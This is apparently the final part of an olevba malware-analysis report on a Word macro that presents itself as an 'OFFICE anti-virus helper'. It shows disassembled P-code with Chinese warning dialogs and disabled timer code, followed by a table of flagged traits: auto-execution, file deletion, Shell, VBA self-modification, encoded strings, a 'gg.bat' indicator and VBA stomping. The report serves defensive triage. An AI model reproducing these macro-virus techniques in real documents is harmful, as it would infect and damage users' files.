' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #431:
' Line #432:
' 	Label nx 
' Line #433:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x052F 
' 	Eq 
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0424 
' 	Eq 
' 	Or 
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x04A7 
' 	Eq 
' 	Or 
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0017 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0042 "磁碟為防寫模式或空間不夠或有人正在使用此檔案，所以無法備份或解毒。"
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' 	EndIf 
' Line #434:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #435:
' Line #436:
' Line #437:
' 	Label done 
' Line #438:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x0023 "h = WordBasic.Hour(WordBasic.Now())"
' Line #441:
' 	QuoteRem 0x0000 0x0029 "m = WordBasic.Minute(WordBasic.Now()) + 1"
' Line #442:
' 	QuoteRem 0x0000 0x0025 "s = WordBasic.Second(WordBasic.Now())"
' Line #443:
' Line #444:
' 	QuoteRem 0x0000 0x000E "If m > 59 Then"
' Line #445:
' 	QuoteRem 0x0000 0x0005 "m = 1"
' Line #446:
' 	QuoteRem 0x0000 0x0009 "h = h + 1"
' Line #447:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #448:
' 	QuoteRem 0x0000 0x002B "ttm$ = Str(h) + ":" + Str(m) + ":" + Str(s)"
' Line #449:
' 	QuoteRem 0x0000 0x001F "WordBasic.OnTime ttm$, "Detect""
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' 	EndSub 
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' Line #459:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |gg.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

